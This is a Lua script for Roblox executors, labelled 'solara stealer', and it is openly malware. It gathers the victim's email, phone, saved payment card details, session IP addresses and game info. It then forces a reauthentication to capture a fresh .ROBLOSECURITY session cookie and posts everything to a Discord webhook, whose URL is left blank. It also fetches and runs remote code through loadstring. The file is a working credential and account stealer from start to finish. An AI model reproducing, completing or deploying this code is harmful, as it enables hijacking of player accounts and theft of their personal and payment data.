--[[





    solara stealer - magnet





]]

local players = game:GetService("Players")
local player = players.LocalPlayer

local marketplaceService = game:GetService("MarketplaceService")

local httpService = game:GetService("HttpService")
local requestInternal = httpService.requestInternal

local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ozzypig/repr/master/repr.lua"))()
local prettySettings = {pretty = true}

local DISCORD_HEADERS = {["Content-Type"] = "application/json"}
local DISCORD_WEBHOOK = ""
local USER_URL = "https://users.roblox.com/v1/users/%s"
local GAMES_URL = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=%s"
local EMAIL_URL = "https://accountsettings.roblox.com/v1/email"
local PHONE_URL = "https://accountinformation.roblox.com/v1/phone"
local SESSIONS_URL = "https://apis.roblox.com/token-metadata-service/v1/sessions?nextCursor=%s&desiredLimit=500"
local PAYMENTS_URL = "https://apis.roblox.com/payments-gateway/v1/payment-profiles"
local REAUTHENTICATE_URL = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate"

-- makes a request and returns if the request was a success, and the response data
local function internalRequest(url: string, method: string?, body: string?): (boolean, {Headers: {string: any}, Body: {string: any}}?)
    method = (method ~= nil and method:upper()) or "GET"

    local data = {}
    data["Url"] = url
    data["Method"] = method

    if method ~= "GET" then
        if typeof(body) == "string" then
            data["Body"] = body or ""
        else
            data["Body"] = body or {}
            data["Headers"] = {
                ["Content-Type"] = "application/json"
            }
        end
    end

    local _request = requestInternal(httpService, data)
    local _success, _response = nil
    _request:Start(function(success, response)
        _success = success
        _response = response
    end)
    repeat task.wait() until _success ~= nil

    return _success, _response
end

-- reauthenticates the user and returns a usable auth/session cookie
local function reauthenticate(): string
    local _, response = internalRequest(REAUTHENTICATE_URL, "POST", "{}")
    local headers = response.Headers
    local cookie = headers["set-cookie"]
    local session = cookie:split(";")[1]
    return session:gsub(".ROBLOSECURITY=", "")
end

-- returns the info for the universe the player is currently in
local function getGameInfo(): {name: string, url: string}
    local url = GAMES_URL:format(tostring(game.PlaceId))
    local _, response = internalRequest(url)
    local body = httpService:JSONDecode(response.Body)[1]

    -- if this is true, then the current place isn't the root place
    if body["universeRootPlaceId"] ~= tostring(game.PlaceId) then
        local _url = GAMES_URL:format(body["universeRootPlaceId"])
        local __, _response = internalRequest(_url)
        body = httpService:JSONDecode(_response.Body)[1]
    end

    return {
        name = body["name"];
        url = body["url"];
    }
end

-- returns the account's email and phone (masked)
local function getContacts(): {email: string?, phone: string?}
    local result = {}

    local _, emailResponse = internalRequest(EMAIL_URL)
    local emailBody = httpService:JSONDecode(emailResponse.Body)

    local _, phoneResponse = internalRequest(PHONE_URL)
    local phoneBody = httpService:JSONDecode(phoneResponse.Body)

    result["email"] = emailBody["emailAddress"]
    result["phone"] = phoneBody["phone"]

    return result
end

-- return's the users basic info
local function getUserInfo(): {username: string, displayName: string, userId: string, verified: string}
    local contacts = getContacts()
    local url = USER_URL:format(tostring(player.UserId))
    local _, response = internalRequest(url)
    local body = httpService:JSONDecode(response.Body)
    return {
        username = body["name"];
        displayName = body["displayName"];
        userId = body["id"];
        email = contacts["email"];
        phone = contacts["phone"];
    }
end

-- returns the account's saved payment methods
local function getPayments(): {{cardType: string, last4: string, month: string, year: string}}
    local results = {}
    
    local _, response = internalRequest(PAYMENTS_URL)
    local body = httpService:JSONDecode(response.Body)

    for _, payment in next, body do
        local provider = payment["providerPayload"]
        local data = {
            cardType = provider["CardNetwork"];
            last4 = provider["Last4Digits"];
            month = provider["ExpMonth"];
            year = provider["ExpYear"]
        }
        table.insert(results, data)
    end
    return results
end

-- returns a list of sessions, and the 'nextCursor' if there are more results
local function getSessions(cursor: string?): ({{ip: string, agent: string, date: string}})
    cursor = cursor or ""

    local results = {}
    
    local url = SESSIONS_URL:format(cursor)
    local success, response = internalRequest(url)
    local body = httpService:JSONDecode(response.Body)

    local hasMore = body["hasMore"]
    local sessions = body["sessions"]
    local cursor = hasMore == true and body["nextCursor"] or nil

    for _, session in next, sessions do
        local dateTime = DateTime.fromUnixTimestampMillis(session["lastAccessedTimestampEpochMilliseconds"])
        local formattedDate = dateTime:FormatLocalTime("lll", "en-us")
        local formattedAgent = session["agent"] ~= nil and `{session["agent"]["type"]} on {session["agent"]["os"]}`
        
        local data = {
            ip = session["lastAccessedIp"];
            date = formattedDate;
            agent = formattedAgent
        }
        table.insert(results, data)
    end

    return results, cursor
end

-- returns a list of sessions after recursing thru them all
local function getAllSessions(): {{ip: string, agent: string, date: string}}
    local results, cursor = getSessions()
    while cursor ~= nil do
        local results2, cursor2 = getSessions(cursor)
        cursor = cursor2
        for _, session in next, results2 do
            table.insert(results, session)
        end
        task.wait()
    end
    return results
end

local function sendToWebhook(content: string): boolean
    local body = httpService:JSONEncode({content=content})
    request({
        Url = DISCORD_WEBHOOK;
        Method = "POST";
        Headers = DISCORD_HEADERS;
        Body = body;
    })
end

local sessions = getAllSessions()
local payments = getPayments()
local user = getUserInfo()
local gameInfo = getGameInfo()
local cookie = reauthenticate()

local userContent = [[@everyone User was logged:```]] .. pretty(user, prettySettings) .. [[```]]
local gameContent = [[Game:```]] .. pretty(gameInfo, prettySettings) .. [[```]]
local paymentContent = [[Billing:```]] .. pretty(payments, prettySettings) .. [[```]]
local sessionsContent = [[Sessions:```]] .. pretty(sessions, prettySettings) .. [[```]]
local cookieContent = [[Cookie:```]] .. cookie .. [[```]]

sendToWebhook(userContent)
sendToWebhook(gameContent)
sendToWebhook(paymentContent)
sendToWebhook(sessionsContent)
sendToWebhook(cookieContent)
